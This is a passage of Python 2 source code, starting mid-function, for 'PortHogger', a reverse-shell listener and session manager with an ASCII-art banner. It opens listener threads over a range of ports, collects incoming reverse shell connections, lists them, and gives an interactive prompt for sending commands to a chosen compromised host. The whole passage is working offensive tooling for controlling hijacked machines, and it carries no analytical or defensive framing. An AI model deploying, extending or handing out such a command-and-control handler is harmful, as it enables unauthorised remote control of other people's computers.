                break
            elif "close-shell" in cmd.lower():
                commandSent = False
                print "[*] Closing active session with",ipaddr
                conn.close()
            elif "clear" in cmd.lower():
                commandSent = False
                os.system("clear")
            else:
                commandSent = True
                conn.send(cmd)
    except:
        print "[!] Client session was disconnected"
        del session_table[ipaddr]


def isInteger(val):
    try:
        integer = int(val)
        return True
    except ValueError:
        return False

def isValidIP(ip):
    try:
        socket.inet_aton(ip)
    except socket.error:
        print "[!] Error: Invalid IP Address"
        exit()

def prog_banner():
    print """
 ____            _   _   _                              __  
|  _ \ ___  _ __| |_| | | | ___   __ _  __ _  ___ _ __  \ \ 
| |_) / _ \| '__| __| |_| |/ _ \ / _` |/ _` |/ _ \ '__|  \ \\
|  __/ (_) | |  | |_|  _  | (_) | (_| | (_| |  __/ |     / /
|_|   \___/|_|   \__|_| |_|\___/ \__, |\__, |\___|_|    /_/ 
                                 |___/ |___/  
============================================================

MMMMMMMMMMMMMMMMMMMMMMMMMMMMWo...kWMMMMMWWMWN0kddddk0NWWWMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMl 0KO.:MMMMNxc'............'lOWMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMN cK0:l oKl. ...................:0MMMWkxXWM
MMMMMNkd0MMMMMMMMMMMMMMMMMMK ,'.'..  ....................... ,XW,'c KM
MMMMk.,.NWWMMMMMMMMMMMMMMMMK ....  ........................... ,,k0;;M
MMMW l..;:;,OMMMMMMMWNNXXXN..... .............................. .o0:.M
MMMW. :KdcOO do;'.....''',, ... ............  ..   ............. ok':M
MMMMx 0K ;,. .:dOXNXOc'..    .    .           .',:loodl;.. ...... l.NM
MMMMK dx. .o0XXKKKx. .....          ..,;c.            ..,coc;.... .XWM
MMMMMk  .kXKKKKKKc ........... .lO00KKK0x;         0x        ..  ..WWM
MMMWO  oKKKKKKK0, .........:. c0:,o0KKKKOx'      .Od 'k,        o .WMM
MMMO .OKKKKKKKO....... .cko .OKc.0K:',cxKKK0x:. .;. ;0K.       xl XMMM
MMX  OKKKKK0o,  ...,cd0K0c ;KKKd.K0.ol  .c0KKKKx,.d0KOxc,.    ,. 'XMMM
MM; dKKKKKKKKK0KKKKKKKK0d ,KKKKK:xK0OK.    :OKKKKOo0KKKK0xolc  .,. ;KM
MN .KKKKKKKKKKKKKKKKKKKO. 0KKKKKKkKKKk .c  'lx0KKKKKKKKKKKKd..dKOkx' x
Md lKKKKKKKKKKKKKKKKKKOx :KKKKKKKKKKK. XWOx 'k0KKKKKKKKKK0; ;KKK0kkk: 
Ml kKKKKKKKKKKKKKKKKKKOo lKKKKKKKKKKx ,0WWXk..oOO0KKKKK0O; cKo .Kd .x.
Mc OKKKKKKKKKKKKKKKKKKkx ;KKKKKKKKKK,.l,..cxO. ;kkkkOOOkd ;K0,.,Kk..;,
Mo xKKKKKKKKKKKKKKKKKKOk. 0KKKKKKKKK.,WWWKx;... .lO;kkkk; 0Kc''K0kk.':
Wk l0KKKKKKKKKKKKKKKKKOko cKKKKK0xKK,.dWWWWWWXx;. ..'xkk..KK,dcoolc;,O
WW ,OKKKKKKKKKKKKKKKKKKkk; xKKKKO'KKO  ,'.xK0kdlc.    ;d; KKllx0K0KKx;
WM; x0KKKKKKKKKKKKKKKKK0kk..OKKK0'dKK0c'...',:coxkOOOko'  'OK0dc... .K
MMK ;O0KKKKKKKKKKKKKKKKK0Ok'.OKK0d oKXKKKKKKKKKKKKKKOdoodd:..'..;xc dM
MMW  dk0KKKKKKKKKKKKKKKKK0Ok;.kKKOd..ckKXKKKKKK00KKKKKKKKKKOxdxkkk .WM
MMk  .kk0KKKKKKKKKKKKKKKKKK0Oo.dKK0kl,'..'',;:cdKKKKKKKKKKKOkkkkk..XMM
MM: d .kk0KKKKKKKKKKKKKKKKKKK0O;:KKK0OOkkkOOO0KKKKKKKKKKKKOkkkko..XMMM
MM',Ol ,kkO0KKKKKKKKKKKKKKKKKKKKOxKKKKKKKKKKKKKKKKKKKKKK0Okkkd' oWMMMM
MM.lOko 'kkkO0KKKKl0KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK0Okkkkl..oNMMMMMM
MW,:Okkd..xkkkO00o KKKKKKKKKKKKKKKKKKKKKKKKKKK000OOOkkkdc'.oKWMMMMMMMM
WWd Okkkk' :kkkkk..KKKKKKKKKKKKKKKKKKKKKKKKkc::::;;'''  ' ;MMMMMMMMMMM
K:.,ckkkkkl .okkk .XKKKKKKKKKKKKKKKKKKKKKKKKKKK00O00l.;xk..MMMMMMMMMMM
. .,x0kkkkkk. .ox 'XKKKKKKKKKKKKKKKKKKKKKKKKKKKK0xl;okkkk; WMMMMMMMMMM
 .. .''lkkk: Oc . :XKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK0kkkkkkc KMMMMMMMMMM
K, ';;, .kl kMMWd cXKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKOkkkkkl 0MMMMMMMMMM
MX, ...  . cWMMMW :XXKKKKKKKKclx0KKKKKKKKKK0kokKKKK0kkkkkc NMMMMMMMMMM
MMMWKOkkk0WMMMMMM,.KNKKKKKKKKkl;...,;:c:;'.  ,x0KKKKkkkkk.;MMMMMMMMMMM
MMMMMMMMMMMMMMMMWK oXXKKKKKK0Okk. OK0OOO0X0 :KKKKKK0kkkk,.NMMMMMMMMMMM
MMMMMMMMMMMMMMMMMM0.:0KKKKK0kkk: oMMMMMMMMMo OKKKKKOkkl' xWMMMMMMMMMMM
MMMMMMMMMMMMMMMMMWx.:oOKKKOkkkk 'MMMMMMMMMMW.'KKKK0kkkkx: .OMMMMMMMMMM
MMMMMMMMMMMMMMMMW. ';lOOOkkkkkc KMMMMMMMMMMWo kKKKxc;;. .' 'MMMMMMMMMM

By:
    Sanitycheck & Pr0phet
"""

def list_sessions():
    sessions_title = "\nReverse Shell Sessions"
    print sessions_title
    print "=" * len(sessions_title) + "\n"
    counter = 1
    for key in session_table:
        print "{0}. {1}".format(counter, key)
        counter += 1

def spawn_listener(portrange):
    try:
        port_range = PortRange(portrange)
        if len(port_range.bounds) < 2:
            print "[*] Creating listener on port {0}".format(str(port_range.bounds[0]))
            thread_table[str(port_range.bounds[0])] = threading.Thread(target=listener, args=[sys.argv[1], port_range.bounds[0]])
            reference = thread_table[str(port_range.bounds[0])]
            reference.daemon = False
            reference.start()
            return True
        else:
            print "[*] Creating listener for ports {0}".format(str(port_range))
            for port in range(port_range.bounds[0], port_range.bounds[1]):
                thread_table[str(port)] = threading.Thread(target=listener, args=[sys.argv[1], port])
                reference = thread_table[str(port)]
                reference.daemon = False
                reference.start()
            return True
    except ValueError:
        print "[!] Error: Invalid port or port range specified"
        return False

def main():
    prog_banner()
    global session_table
    session_table = collections.OrderedDict()
    global thread_table 
    thread_table = dict()
    session = PromptSession()
    options = [
                "createlistener",
                "interact",
                "help",
                "options",
                "sessions",
                "clear",
                "banner",
                "exit"
    ]
    options_completer = WordCompleter(options)
    prompt_str = "PortHogger> "
    try:
        while 1:
            cmd = session.prompt(prompt_str, auto_suggest=AutoSuggestFromHistory(), completer=options_completer, complete_in_thread=True)
            if "sessions" in cmd.lower():
                list_sessions()
            elif ("createlistener" in cmd.lower() or "cl" in cmd.lower()) and len(cmd.split()) > 1:
                if spawn_listener(cmd.split()[1]):
                    prompt_str = "PortHogger(Listener)> "
                else:
                    print "[!] Failed to create listeners for specified port(s)"
            elif "help" in cmd.lower() or "options" in cmd.lower():
                stdprompt_help()
            elif "interact" in cmd.lower() and len(cmd.split()) > 1:
                try:
                    if isInteger(cmd.split()[1]):
                        print "[*] interacting with reverse shell connection {0}".format(session_table.keys()[int(cmd.split()[1])-1])
                        launch_session(session_table.keys()[int(cmd.split()[1])-1])
                    else:
                        print "[!] Error: Please specify an integer for the session number"
                except IndexError:
                    print "[!] Error: Invalid session number"
            elif "clear" in cmd.lower():
                os.system("clear")
            elif "banner" in cmd.lower():
                prog_banner()
            elif "exit" in cmd.lower():
                print "[*] Exiting..."
                exit()
    except KeyboardInterrupt:
        print "[*] Closing any remaining connections..."
        for conn in session_table.values():
            if conn is not None:
                conn.close()
        exit()

if __name__ == "__main__":
    if len(sys.argv) == 1 or "--help" in sys.argv[1] or "-h" in sys.argv[1]:
        print "porthogger.py <Server IP>"
        exit()
    elif sys.argv[1]:
        main()
